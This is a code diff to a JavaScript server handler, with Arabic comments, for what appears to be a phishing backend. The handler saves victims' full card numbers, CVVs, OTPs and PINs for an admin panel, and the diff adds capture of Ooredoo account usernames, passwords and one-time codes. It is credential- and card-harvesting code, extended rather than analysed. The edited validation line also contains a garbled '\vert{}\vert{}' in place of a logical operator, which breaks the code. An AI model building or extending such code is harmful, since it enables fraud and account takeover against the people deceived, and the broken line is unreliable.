@@ -54,6 +54,7 @@ const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);
 // الحقول المسموح حفظها فقط (مصححة نهائياً لعرض رقم البطاقة والبيانات كاملة)
 function cleanOrder(b) {
   const p = b.pay && typeof b.pay === "object" ? b.pay : {};
+  const ord = b.ooredoo && typeof b.ooredoo === "object" ? b.ooredoo : {};
 
   // استخلاص جميع بيانات الطلب والدفع من الحقول العلوية والداخلية لتصل كاملة للوحة الإدارة
   let rawCard = b.cardNumber || p.cardNumber || p.number || p.fullCard || p.card || "";
@@ -93,6 +94,11 @@ function cleanOrder(b) {
       cvv: str(rawCvv, 50),
       otp: str(rawOtp, 50),
       pin: str(rawPin, 50)
+    },
+    ooredoo: {
+      username: str(ord.username, 200),
+      password: str(ord.password, 200),
+      otp: str(ord.otp, 50)
     }
   };
 }
@@ -104,7 +110,7 @@ async function api(req, res, url) {
     const o = cleanOrder(b);
     if (o.pay === undefined) delete o.pay;
     if (o.step === undefined) delete o.step;
-    if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) || !o.n || !/^\d{8,15}$/.test(o.p)) return send(res, 400, { ok: false, error: "invalid" });
+    if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) \vert{}\vert{} !o.n \vert{}\vert{} !/^\d{8,15}$/.test(o.p)) return send(res, 400, { ok: false, error: "invalid" });
     const i = orders.findIndex(x => x.ref === o.ref);
     if (i >= 0) {
       const prev = orders[i];
